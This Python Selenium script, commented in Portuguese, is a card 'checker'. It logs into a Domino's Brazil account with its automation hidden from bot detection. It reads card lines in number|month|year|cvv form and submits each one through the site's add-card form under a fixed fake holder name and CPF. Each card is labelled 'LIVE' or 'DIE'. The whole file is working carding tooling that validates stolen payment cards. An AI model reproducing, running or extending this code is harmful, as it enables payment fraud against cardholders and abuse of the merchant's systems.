import os
import time
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

class DominosChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.driver = None
        self.wait = None
        self.lock = threading.Lock()
        
    def _get_driver(self):
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--single-process')
        options.add_argument('--no-default-browser-check')
        options.add_argument('--no-first-run')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)

        # Caminhos comuns no Railway / Docker
        chromium_paths = [
            '/usr/bin/chromium',
            '/usr/bin/chromium-browser',
            '/usr/bin/google-chrome',
            '/usr/bin/chromium-browser'
        ]
        for path in chromium_paths:
            if os.path.exists(path):
                options.binary_location = path
                print(f"[Checker] Usando binário Chromium: {path}")
                break

        chromedriver_paths = [
            '/usr/bin/chromedriver',
            '/usr/lib/chromium/chromedriver',
            '/usr/lib/chromium-browser/chromedriver',
            '/usr/local/bin/chromedriver'
        ]

        for path in chromedriver_paths:
            if os.path.exists(path):
                try:
                    service = Service(path)
                    driver = webdriver.Chrome(service=service, options=options)
                    print(f"[Checker] Chromium + ChromeDriver inicializado via: {path}")
                    return driver
                except Exception as e:
                    print(f"[Checker] Falha ao usar {path}: {e}")

        print("[Checker] ERRO: Nenhum chromedriver encontrado!")
        return None

    def start_session(self):
        if self.driver is not None:
            return True

        print("[Checker] Iniciando nova sessão Chrome...")
        self.driver = self._get_driver()
        if not self.driver:
            print("[Checker] ERRO CRÍTICO: Não foi possível iniciar o navegador")
            return False

        self.wait = WebDriverWait(self.driver, 20)  # aumentado para 20s
        
        try:
            print("[Checker] Acessando página de login Dominos...")
            self.driver.get("https://www.dominos.com.br/login")
            
            # Clique em "Login com senha"
            btn_login_senha = self.wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login com senha')] | //ion-button[contains(., 'Login com senha')]")
            ))
            self.driver.execute_script("arguments[0].click();", btn_login_senha)

            # Email
            input_email = self.wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
            input_email.clear()
            input_email.send_keys(self.email)

            # Senha
            input_senha = self.wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
            input_senha.clear()
            input_senha.send_keys(self.password)

            # Botão Entrar
            btn_entrar = self.wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'entrar')] | //ion-button[contains(., 'Entrar')]")
            ))
            self.driver.execute_script("arguments[0].click();", btn_entrar)
            
            print("[Checker] Login submetido! Aguardando redirecionamento...")
            time.sleep(6)  # Dominos costuma demorar um pouco
            return True

        except Exception as e:
            print(f"[Checker] Erro durante o login: {e}")
            self.stop_session()
            return False

    def test_card(self, linha):
        with self.lock:
            if not self.driver:
                if not self.start_session():
                    return "ERROR: Não foi possível fazer login na Dominos"

            linha = linha.strip()
            partes = linha.split("|")
            if len(partes) != 4:
                return "DIE"
            
            numero, mes, ano, cvv = partes
            if len(ano) == 4:
                ano = ano[-2:]

            try:
                print(f"[Checker] Testando cartão: {numero[:6]}******")
                self.driver.get("https://www.dominos.com.br/my-cards")
                time.sleep(4)

                # Botão "Adicionar novo cartão"
                btn_add_cartao = self.wait.until(EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'adicionar novo cartão')] | //ion-button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'adicionar novo cartão')]")
                ))
                self.driver.execute_script("arguments[0].scrollIntoView(true);", btn_add_cartao)
                time.sleep(1)
                self.driver.execute_script("arguments[0].click();", btn_add_cartao)
                time.sleep(3)

                # Preencher campos
                ActionChains(self.driver).move_to_element(
                    self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
                ).click().send_keys("Afonso Claudio").perform()

                ActionChains(self.driver).move_to_element(
                    self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
                ).click().send_keys("Afonso Claudio").perform()

                ActionChains(self.driver).move_to_element(
                    self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
                ).click().send_keys("84830336072").perform()

                data_validade = f"{mes}{ano}"

                # Número do cartão (iframe)
                try:
                    iframe_num = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para número do cartão']")
                    if iframe_num:
                        self.driver.switch_to.frame(iframe_num[0])
                    input_numero = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedCardNumber")))
                    input_numero.send_keys(numero)
                finally:
                    self.driver.switch_to.default_content()

                # Validade (iframe)
                try:
                    iframe_exp = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para data de validade']")
                    if iframe_exp:
                        self.driver.switch_to.frame(iframe_exp[0])
                    input_validade = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedExpiryDate")))
                    input_validade.send_keys(data_validade)
                finally:
                    self.driver.switch_to.default_content()

                # CVV (iframe)
                try:
                    iframe_cvv = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para código de segurança']")
                    if iframe_cvv:
                        self.driver.switch_to.frame(iframe_cvv[0])
                    input_cvv = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedSecurityCode")))
                    input_cvv.send_keys(cvv)
                finally:
                    self.driver.switch_to.default_content()

                # Clicar em Salvar
                btn_salvar = self.wait.until(EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'salvar')] | //ion-button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'salvar')]")
                ))
                self.driver.execute_script("arguments[0].click();", btn_salvar)
                
                print("[Checker] Cartão enviado. Aguardando resposta...")
                time.sleep(7)  # Tempo importante para o backend processar

                # === NOVA VERIFICAÇÃO MAIS CONFIÁVEL ===
                # 1. Procura mensagens de sucesso (toast)
                success_xpaths = [
                    "//ion-toast[contains(., 'sucesso') or contains(., 'adicionado') or contains(., 'salvo')]",
                    "//*[contains(text(), 'Cartão adicionado') or contains(text(), 'adicionado com sucesso')]",
                    "//h3[contains(text(), 'Meus Cartões')]"
                ]

                for xpath in success_xpaths:
                    try:
                        elem = self.driver.find_element(By.XPATH, xpath)
                        if elem.is_displayed():
                            print(f"[Checker] SUCESSO detectado: {xpath}")
                            return "LIVE"
                    except:
                        continue

                # 2. Se ainda estiver no formulário de adicionar → provavelmente DIE
                try:
                    form_still_open = self.driver.find_element(By.XPATH,
                        "//ion-input[@formcontrolname='name'] | //input[@placeholder='CPF do titular'] | //ion-button[contains(., 'Salvar')]"
                    )
                    if form_still_open.is_displayed():
                        print("[Checker] Formulário ainda visível → DIE")
                        return "DIE"
                except:
                    pass

                # 3. Fallback: se não deu erro e saiu do formulário → considera LIVE
                print("[Checker] Nenhum erro visível e formulário desapareceu → assumindo LIVE")
                return "LIVE"

            except Exception as ex:
                print(f"[Checker] Erro ao testar cartão {numero[:6]}...: {ex}")
                self.stop_session()  # reseta sessão para próxima tentativa
                return "DIE"

    def stop_session(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
            self.wait = None

# Instância global
checker_instance = None
